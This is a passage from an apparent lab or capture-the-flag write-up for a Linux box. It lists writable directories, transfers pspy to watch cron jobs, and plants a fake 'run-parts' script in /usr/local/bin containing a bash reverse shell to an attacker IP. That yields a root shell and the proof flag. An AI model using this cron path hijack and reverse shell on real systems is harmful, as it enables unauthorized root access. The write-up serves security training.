/var/lib/gitea/data/sessions/4/6
/var/lib/gitea/data/sessions/c
/var/lib/gitea/data/sessions/c/e
/var/lib/gitea/data/sessions/c/3
/var/lib/gitea/data/sessions/c/9
/var/lib/gitea/data/sessions/c/a
/var/lib/gitea/data/sessions/c/5
/var/lib/gitea/data/sessions/c/4
/var/lib/gitea/data/sessions/c/c
/var/lib/gitea/data/sessions/c/f
/var/lib/gitea/data/sessions/c/0
/var/lib/gitea/data/sessions/c/d
/var/lib/gitea/data/sessions/c/7
/var/lib/gitea/data/sessions/c/8
/var/lib/gitea/data/sessions/c/b
/var/lib/gitea/data/sessions/c/1
/var/lib/gitea/data/sessions/c/2
/var/lib/gitea/data/sessions/c/6
/var/lib/gitea/data/sessions/f
/var/lib/gitea/data/sessions/f/e
/var/lib/gitea/data/sessions/f/3
/var/lib/gitea/data/sessions/f/9
/var/lib/gitea/data/sessions/f/a
/var/lib/gitea/data/sessions/f/5
/var/lib/gitea/data/sessions/f/4
/var/lib/gitea/data/sessions/f/c
/var/lib/gitea/data/sessions/f/f
/var/lib/gitea/data/sessions/f/0
/var/lib/gitea/data/sessions/f/d
/var/lib/gitea/data/sessions/f/7
/var/lib/gitea/data/sessions/f/8
/var/lib/gitea/data/sessions/f/b
/var/lib/gitea/data/sessions/f/1
/var/lib/gitea/data/sessions/f/2
/var/lib/gitea/data/sessions/f/6
/var/lib/gitea/data/sessions/0
/var/lib/gitea/data/sessions/0/e
/var/lib/gitea/data/sessions/0/3
/var/lib/gitea/data/sessions/0/9
/var/lib/gitea/data/sessions/0/a
/var/lib/gitea/data/sessions/0/5
/var/lib/gitea/data/sessions/0/4
/var/lib/gitea/data/sessions/0/c
/var/lib/gitea/data/sessions/0/f
/var/lib/gitea/data/sessions/0/0
/var/lib/gitea/data/sessions/0/d
/var/lib/gitea/data/sessions/0/7
/var/lib/gitea/data/sessions/0/8
/var/lib/gitea/data/sessions/0/b
/var/lib/gitea/data/sessions/0/1
/var/lib/gitea/data/sessions/0/2
/var/lib/gitea/data/sessions/0/6
/var/lib/gitea/data/sessions/d
/var/lib/gitea/data/sessions/d/e
/var/lib/gitea/data/sessions/d/3
/var/lib/gitea/data/sessions/d/9
/var/lib/gitea/data/sessions/d/a
/var/lib/gitea/data/sessions/d/5
/var/lib/gitea/data/sessions/d/4
/var/lib/gitea/data/sessions/d/c
/var/lib/gitea/data/sessions/d/f
/var/lib/gitea/data/sessions/d/0
/var/lib/gitea/data/sessions/d/d
/var/lib/gitea/data/sessions/d/7
/var/lib/gitea/data/sessions/d/8
/var/lib/gitea/data/sessions/d/b
/var/lib/gitea/data/sessions/d/1
/var/lib/gitea/data/sessions/d/2
/var/lib/gitea/data/sessions/d/6
/var/lib/gitea/data/sessions/7
/var/lib/gitea/data/sessions/7/e
/var/lib/gitea/data/sessions/7/3
/var/lib/gitea/data/sessions/7/9
/var/lib/gitea/data/sessions/7/a
/var/lib/gitea/data/sessions/7/5
/var/lib/gitea/data/sessions/7/4
/var/lib/gitea/data/sessions/7/c
/var/lib/gitea/data/sessions/7/f
/var/lib/gitea/data/sessions/7/0
/var/lib/gitea/data/sessions/7/d
/var/lib/gitea/data/sessions/7/7
/var/lib/gitea/data/sessions/7/8
/var/lib/gitea/data/sessions/7/b
/var/lib/gitea/data/sessions/7/1
/var/lib/gitea/data/sessions/7/2
/var/lib/gitea/data/sessions/7/6
/var/lib/gitea/data/sessions/8
/var/lib/gitea/data/sessions/8/e
/var/lib/gitea/data/sessions/8/3
/var/lib/gitea/data/sessions/8/9
/var/lib/gitea/data/sessions/8/a
/var/lib/gitea/data/sessions/8/5
/var/lib/gitea/data/sessions/8/4
/var/lib/gitea/data/sessions/8/c
/var/lib/gitea/data/sessions/8/f
/var/lib/gitea/data/sessions/8/0
/var/lib/gitea/data/sessions/8/d
/var/lib/gitea/data/sessions/8/7
/var/lib/gitea/data/sessions/8/8
/var/lib/gitea/data/sessions/8/b
/var/lib/gitea/data/sessions/8/1
/var/lib/gitea/data/sessions/8/2
/var/lib/gitea/data/sessions/8/6
/var/lib/gitea/data/sessions/b
/var/lib/gitea/data/sessions/b/e
/var/lib/gitea/data/sessions/b/3
/var/lib/gitea/data/sessions/b/9
/var/lib/gitea/data/sessions/b/a
/var/lib/gitea/data/sessions/b/5
/var/lib/gitea/data/sessions/b/4
/var/lib/gitea/data/sessions/b/c
/var/lib/gitea/data/sessions/b/f
/var/lib/gitea/data/sessions/b/0
/var/lib/gitea/data/sessions/b/d
/var/lib/gitea/data/sessions/b/7
/var/lib/gitea/data/sessions/b/8
/var/lib/gitea/data/sessions/b/b
/var/lib/gitea/data/sessions/b/1
/var/lib/gitea/data/sessions/b/2
/var/lib/gitea/data/sessions/b/6
/var/lib/gitea/data/sessions/1
/var/lib/gitea/data/sessions/1/e
/var/lib/gitea/data/sessions/1/3
/var/lib/gitea/data/sessions/1/9
/var/lib/gitea/data/sessions/1/a
/var/lib/gitea/data/sessions/1/5
/var/lib/gitea/data/sessions/1/4
/var/lib/gitea/data/sessions/1/c
/var/lib/gitea/data/sessions/1/f
/var/lib/gitea/data/sessions/1/0
/var/lib/gitea/data/sessions/1/d
/var/lib/gitea/data/sessions/1/7
/var/lib/gitea/data/sessions/1/8
/var/lib/gitea/data/sessions/1/b
/var/lib/gitea/data/sessions/1/1
/var/lib/gitea/data/sessions/1/2
/var/lib/gitea/data/sessions/1/6
/var/lib/gitea/data/sessions/2
/var/lib/gitea/data/sessions/2/e
/var/lib/gitea/data/sessions/2/3
/var/lib/gitea/data/sessions/2/9
/var/lib/gitea/data/sessions/2/a
/var/lib/gitea/data/sessions/2/5
/var/lib/gitea/data/sessions/2/4
/var/lib/gitea/data/sessions/2/c
/var/lib/gitea/data/sessions/2/f
/var/lib/gitea/data/sessions/2/0
/var/lib/gitea/data/sessions/2/d
/var/lib/gitea/data/sessions/2/7
/var/lib/gitea/data/sessions/2/8
/var/lib/gitea/data/sessions/2/b
/var/lib/gitea/data/sessions/2/1
/var/lib/gitea/data/sessions/2/2
/var/lib/gitea/data/sessions/2/6
/var/lib/gitea/data/sessions/6
/var/lib/gitea/data/sessions/6/e
/var/lib/gitea/data/sessions/6/3
/var/lib/gitea/data/sessions/6/9
/var/lib/gitea/data/sessions/6/a
/var/lib/gitea/data/sessions/6/5
/var/lib/gitea/data/sessions/6/4
/var/lib/gitea/data/sessions/6/c
/var/lib/gitea/data/sessions/6/f
/var/lib/gitea/data/sessions/6/0
/var/lib/gitea/data/sessions/6/d
/var/lib/gitea/data/sessions/6/7
/var/lib/gitea/data/sessions/6/8
/var/lib/gitea/data/sessions/6/b
/var/lib/gitea/data/sessions/6/1
/var/lib/gitea/data/sessions/6/2
/var/lib/gitea/data/sessions/6/6
/var/lib/gitea/custom
/var/tmp
/run/lock
/proc/2465/task/2465/fd
/proc/2465/fd
/proc/2465/map_files
/dev/mqueue
/dev/shm
/usr/local/bin
/tmp
/tmp/.X11-unix
/tmp/.Test-unix
/tmp/.ICE-unix
/tmp/.font-unix
/tmp/.XIM-unix
/home/chloe
```

Let's check if there is any running cronjobs with root perms utilizing pspy64s.

Started up an python server running on port 2222.

```
python3 -m http.server 2222
```

Downloaded the file.

```
chloe@roquefort:/tmp$ wget http://192.168.45.221:2222/pspy64s
--2025-12-28 10:46:11--  http://192.168.45.221:2222/pspy64s
Connecting to 192.168.45.221:2222... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1233888 (1.2M) [application/octet-stream]
Saving to: ‘pspy64s’

pspy64s                                             0%[                                                                                       pspy64s                                            13%[=============>                                                                         pspy64s                                            67%[=========================================================================>             pspy64s                                            67%[=========================================================================>             pspy64s                                            67%[=========================================================================>             pspy64s                                           100%[=============================================================================================================>]   1.18M   405KB/s    in 3.0s    

2025-12-28 10:46:14 (405 KB/s) - ‘pspy64s’ saved [1233888/1233888]
```

Gave pspy64s executable rights.

```
chmod +x pspy64s
```

When trying to run, we identified that we need the 32-bit version

```
chloe@roquefort:/tmp$ ./pspy64s 
./pspy64s: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by ./pspy64s)
./pspy64s: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./pspy64s)
```

Downloaded it.

```
chloe@roquefort:/tmp$ wget http://192.168.45.221:2222/pspy32
--2025-12-28 10:48:07--  http://192.168.45.221:2222/pspy32
Connecting to 192.168.45.221:2222... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2940928 (2.8M) [application/octet-stream]
Saving to: ‘pspy32’

pspy32                                              0%[                                                                                       pspy32                                              5%[=====>                                                                                 pspy32                                             29%[===============================>                                                       pspy32                                             42%[==============================================>                                        pspy32                                             57%[==============================================================>                        pspy32                                             68%[=========================================================================>             pspy32                                             81%[=======================================================================================pspy32                                             93%[=======================================================================================pspy32                                            100%[=============================================================================================================>]   2.80M  1.81MB/s    in 1.6s    

2025-12-28 10:48:09 (1.81 MB/s) - ‘pspy32’ saved [2940928/2940928]
```

Gave it executable perms.

```
chmod +x pspy32
```

Ran it, but didn't discover anything.

Since the first cronjob executes every 5 minutes, let's create an malicious script "run-parts" and put it in /usr/local/bin since this is the path that takes in the cronjobs.

```
chloe@roquefort:/usr/local/bin$ cat run-parts 
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.221/3000 0>&1'
```

Started up my listener on port 3000.

```
nc -lvnp 3000
```

Gained RCE as user "root".

```
nc -lvnp 3000
listening on [any] 3000 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.130.67] 51974
bash: cannot set terminal process group (2578): Inappropriate ioctl for device
bash: no job control in this shell
root@roquefort:/#
```

Retrieved proof.txt in /root directory.

```
4397930be91d0c3e7c65070d6fd5586c
```
